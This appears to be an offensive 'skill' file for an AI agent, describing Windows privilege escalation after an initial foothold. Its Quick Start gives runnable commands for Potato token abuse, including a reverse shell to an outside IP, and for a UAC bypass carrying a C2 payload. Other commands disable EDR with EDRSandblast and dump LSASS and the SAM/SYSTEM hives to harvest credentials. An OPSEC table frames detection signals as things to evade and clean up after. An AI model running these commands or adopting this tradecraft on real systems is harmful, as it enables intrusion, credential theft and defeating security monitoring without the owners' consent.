---
name: privesc-windows
description: Use when escalating privileges on a Windows host — SeImpersonate Potato chains (GodPotato/PrintNotifyPotato), service & DLL hijacking, UAC bypass (fodhelper/ICMLuaUtil), kernel EoP + BYOVD (CVE-2025-29824), token-rights abuse, LSASS/SAM/DPAPI credential harvesting
metadata:
  type: offensive
  phase: post-exploitation
  tools: winpeas, seatbelt, privesccheck, sharpup, godpotato, sigmapotato, printnotifypotato, fullpowers, edrsandblast, mimikatz, nanodump, pypykatz, impacket-secretsdump
  mitre: TA0004
kill_chain:
  phase: [exploit, actions]
  step: [4, 7]
  attck_tactics: [TA0004, TA0005, TA0006]
  attck_techniques: [T1134, T1134.001, T1134.002, T1543.003, T1574.001, T1574.009, T1574.010, T1548.002, T1068, T1211, T1003.001, T1003.002, T1555.004, T1053.005, T1547.001]
depends_on: [network-attack, exploit-development]
feeds_into: [red-team-ops, advanced-redteam, active-directory-attack, edr-evasion]
inputs: [shell_access, os_fingerprint, service_account_context]
outputs: [elevated_access, system_token, credential_dump, finding_record]
references:
  - references/enumeration-triage.md
  - references/token-impersonation-potatoes.md
  - references/service-dll-hijacking.md
  - references/uac-bypass.md
  - references/kernel-byovd.md
  - references/credential-harvesting.md
scripts:
  - scripts/win_privesc_triage.ps1
  - scripts/check_potato.py
  - scripts/service_hijack_audit.ps1
  - scripts/uac_bypass.ps1
  - scripts/byovd_loader.c
  - scripts/lsass_snapshot_dump.c
---

# Windows Privilege Escalation

## When to Activate

- Gained an initial shell / foothold on Windows and need to reach Administrator or NT AUTHORITY\SYSTEM
- Shell runs as a service account (IIS APPPOOL, MSSQL, Local/Network Service) holding `SeImpersonatePrivilege`
- Standard-user → admin via UAC bypass (medium → high integrity) on a local-admin-group member
- Service / DLL / scheduled-task misconfiguration hunting on the host
- Kernel EoP via an unpatched local CVE or Bring-Your-Own-Vulnerable-Driver (admin → kernel/PPL)
- Privileged token-right abuse (`SeBackup`/`SeRestore`/`SeTakeOwnership`/`SeLoadDriver`/`SeDebug`)
- Local credential harvesting (LSASS, SAM/SYSTEM, DPAPI) to fuel lateral movement

## Technique Map

| Technique | ATT&CK | CWE | Reference | Script |
|-----------|--------|-----|-----------|--------|
| Automated enumeration (winPEAS/Seatbelt/PrivescCheck) | T1082, T1518 | CWE-1188 | references/enumeration-triage.md | scripts/win_privesc_triage.ps1 |
| Token-privilege triage + FullPowers recovery | T1134.001 | CWE-269 | references/enumeration-triage.md | scripts/win_privesc_triage.ps1 |
| SeImpersonate Potato (GodPotato/SigmaPotato/PrintNotify) | T1134.001, T1134.002 | CWE-269 | references/token-impersonation-potatoes.md | scripts/check_potato.py |
| Named-pipe / token impersonation primitives | T1134.001 | CWE-269 | references/token-impersonation-potatoes.md | scripts/check_potato.py |
| Unquoted service path | T1574.009 | CWE-428 | references/service-dll-hijacking.md | scripts/service_hijack_audit.ps1 |
| Weak service ACL / SERVICE_CHANGE_CONFIG | T1543.003 | CWE-732 | references/service-dll-hijacking.md | scripts/service_hijack_audit.ps1 |
| DLL / phantom DLL hijack (CVE-2025-1729, CVE-2024-28827) | T1574.001, T1574.010 | CWE-427 | references/service-dll-hijacking.md | scripts/service_hijack_audit.ps1 |
| UAC bypass — fodhelper/computerdefaults/eventvwr | T1548.002 | CWE-269 | references/uac-bypass.md | scripts/uac_bypass.ps1 |
| UAC bypass — ICMLuaUtil / IEditionUpgradeManager COM | T1548.002 | CWE-269 | references/uac-bypass.md | scripts/uac_bypass.ps1 |
| AlwaysInstallElevated MSI | T1548.002 | CWE-250 | references/uac-bypass.md | scripts/uac_bypass.ps1 |
| Kernel EoP CVE (CLFS CVE-2025-29824/32701; CVE-2025-62215) | T1068 | CWE-416, CWE-362 | references/kernel-byovd.md | scripts/byovd_loader.c |
| BYOVD admin→kernel / EDR-blind (CVE-2025-7771, EDRSandblast) | T1068, T1562.001 | CWE-782 | references/kernel-byovd.md | scripts/byovd_loader.c |
| Privileged token rights (SeBackup/SeRestore/SeLoadDriver/SeDebug) | T1134, T1068 | CWE-269 | references/kernel-byovd.md | scripts/byovd_loader.c |
| LSASS dump (comsvcs / PssCaptureSnapshot / nanodump) | T1003.001 | CWE-522 | references/credential-harvesting.md | scripts/lsass_snapshot_dump.c |
| SAM/SYSTEM + VSS offline secretsdump | T1003.002 | CWE-522 | references/credential-harvesting.md | scripts/lsass_snapshot_dump.c |
| DPAPI / credential vault / browser secrets | T1555.004, T1555.003 | CWE-522 | references/credential-harvesting.md | - |

## Quick Start

```powershell
# 0. Identity + token rights — this decides the whole strategy
whoami /priv /groups
powershell -ep bypass -File scripts/win_privesc_triage.ps1 -Quick

# 1. Full automated enumeration (pick the AV-safest)
.\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report pc_%COMPUTERNAME% -Format TXT,HTML
.\Seatbelt.exe -group=all -full        # build it yourself; do not trust prebuilt binaries
.\winPEASany_ofs.bat                    # .bat variant is less AV-flagged than the .exe

# 2a. Service-account shell with SeImpersonate* -> Potato to SYSTEM
python3 scripts/check_potato.py --priv "$(whoami /priv)"   # picks the right Potato for the host
.\GodPotato-NET4.exe -cmd "cmd /c whoami"                  # Server 2012-2022, no outbound
.\SigmaPotato.exe --revshell 10.10.14.5 443                # fileless .NET-reflection variant
# stripped token (Local/Network Service)? recover privileges first:
.\FullPowers.exe -c "C:\Windows\Tasks\GodPotato-NET4.exe -cmd cmd" -z

# 2b. No SeImpersonate -> hunt service/DLL/scheduled-task misconfig
powershell -ep bypass -File scripts/service_hijack_audit.ps1   # unquoted/weak-ACL/writable-bin/PATH

# 2c. Standard user in local-admin group, UAC on -> bypass to high integrity
powershell -ep bypass -File scripts/uac_bypass.ps1 -Method fodhelper -Payload "cmd.exe /c <c2>"

# 2d. Already admin -> kernel/PPL via BYOVD; then harvest creds
#     (verify driver is NOT on Microsoft blocklist for the build first)
.\EDRSandblast.exe --kernelmode dump_lsass --usermode unhook

# 3. Credentials (run from SYSTEM/admin)
gcc scripts/lsass_snapshot_dump.c -o snap.exe -lDbghelp   # PssCaptureSnapshot dump (stealthier)
.\snap.exe lsass.dmp ; pypykatz lsa minidump lsass.dmp    # parse offline, off-host
reg save HKLM\SAM sam.bak & reg save HKLM\SYSTEM sys.bak  # impacket-secretsdump -sam sam.bak -system sys.bak LOCAL
```

## OPSEC & Detection (summary)

| Technique | Telemetry / IOC | Detection (Sigma / EDR) | OPSEC note |
|-----------|-----------------|--------------------------|------------|
| winPEAS/Seatbelt enum | Mass reg/WMI/service queries; winPEAS.exe on disk (heavily AV-flagged) | EDR hacktool sigs on winPEAS/Seatbelt names+hashes | Build Seatbelt yourself; prefer `.bat`/obfuscated winPEAS or `PrivescCheck.ps1` in-memory |
| Potato (Impersonate) | DCOM/OXID RPC, named-pipe create; SYSTEM child of IIS/MSSQL worker | Sigma `win_susp_potato`; 4674/4688 child SYSTEM under w3wp/sqlservr | Match the COM/RPC surface left open; PrintNotifyPotato avoids RPC redirector that Defender blocks |
| Service hijack | 7045 service install; `sc config` binpath change; service binary write | Sigma `win_susp_service_path`/`sc_config`; 4697/7045 + new binary hash | Restore original binPath/binary after; stage payload outside `C:\Windows` |
| DLL/phantom hijack | Non-MS DLL loaded by SYSTEM process from writable/ProgramData/%PATH% dir | Elastic `phantom_dll`; Sysmon EID 7 unsigned DLL in odd path | Proxy the real DLL to keep app stable; clean the planted DLL post-exec |
| UAC bypass | HKCU `ms-settings`/`mscfile` shell\open\command writes; fodhelper child cmd | Elastic `LUA://HdAutoAp` token attr; Sigma fodhelper/eventvwr reg hijack | Use reg symlink + key rename (UACME m3.5+); delete HKCU keys immediately after trigger |
| Kernel EoP / BYOVD | New 3rd-party `.sys` load (7045/6); SYSTEM token on low-priv proc; EDR driver unload | Sigma `vuln_driver_load`; MS Vulnerable Driver Blocklist; ETWTi token-swap | Driver load is loud + persistent — confirm not blocklisted; unload + delete `.sys`; restore LSTAR/MSR |
| LSASS dump | Handle to lsass w/ PROCESS_VM_READ/DUP; comsvcs MiniDump cmdline; .dmp on disk | Sysmon EID 10 callstack dbghelp/dbgcore; Splunk comsvcs MiniDump; Elastic PssCaptureSnapshot | Use snapshot/handle-dup + parse off-host; avoid `lsass.dmp` literal name; clean the dump |
| SAM/VSS | `reg save HKLM\SAM`; `vssadmin create shadow`; GLOBALROOT copies | Sigma `reg_save_sam`; 8222 VSS; vssadmin process creation | Delete shadow + .bak hives; parse offline with secretsdump LOCAL |
| DPAPI/vault | Reads of `\Microsoft\Protect\*` masterkeys + `\Credentials\*` blobs | EDR access to DPAPI dirs; lsass `dpapi::` calls | Decrypt off-host with masterkey/domain backup key; touch only target user's blobs |

## Deep Dives

- **references/enumeration-triage.md** — Decision tree from `whoami /priv` + groups + integrity; winPEAS/Seatbelt/PrivescCheck/SharpUp usage and AV trade-offs; token-privilege classification table; FullPowers stripped-token recovery; autologon / stored-cred / GPP / scheduled-task XML enumeration.
- **references/token-impersonation-potatoes.md** — Token model (primary vs impersonation, levels), the full 2024-2026 Potato family (GodPotato, SigmaPotato, PrintNotifyPotato, DCOMPotato, EfsPotato, RoguePotato, PrintSpoofer, JuicyPotatoNG), per-OS selection, named-pipe + `DuplicateTokenEx`/`CreateProcessWithTokenW` primitives, detection.
- **references/service-dll-hijacking.md** — Unquoted service path (CWE-428), weak ACL / `SERVICE_CHANGE_CONFIG` / writable binary, DLL search order + KnownDLLs, phantom DLL hijack with real 2025 cases (CVE-2025-1729 Lenovo TPQM, CVE-2024-28827 Checkmk), DLL-proxy stub, scheduled-task abuse.
- **references/uac-bypass.md** — Auto-elevated binary model; fodhelper/computerdefaults/eventvwr/sdclt registry hijacks; ICMLuaUtil & IEditionUpgradeManager COM elevation (2024-2025 status); SilentCleanup env-var hijack; AlwaysInstallElevated MSI; reg-symlink evasion; `LUA://HdAutoAp` detection.
- **references/kernel-byovd.md** — 2025 kernel EoP CVEs (CLFS CVE-2025-29824 & CVE-2025-32701 in-the-wild, Win32k CVE-2025-24983, kernel race CVE-2025-62215); BYOVD theory + DSE/blocklist gap; LOLDrivers, EDRSandblast, GodFault/PPLFault driverless; MSR/LSTAR ring-0; privileged token-right abuse (SeBackup/SeRestore/SeTakeOwnership/SeLoadDriver/SeDebug).
- **references/credential-harvesting.md** — LSASS dumping (comsvcs LOLBin, PssCaptureSnapshot, handle-dup, nanodump, direct-syscall), PPL/RunAsPPL bypass, SAM/SYSTEM + VSS shadow copy, offline secretsdump/pypykatz, DPAPI masterkeys + domain backup key, browser/credential-vault secrets, detection per method.
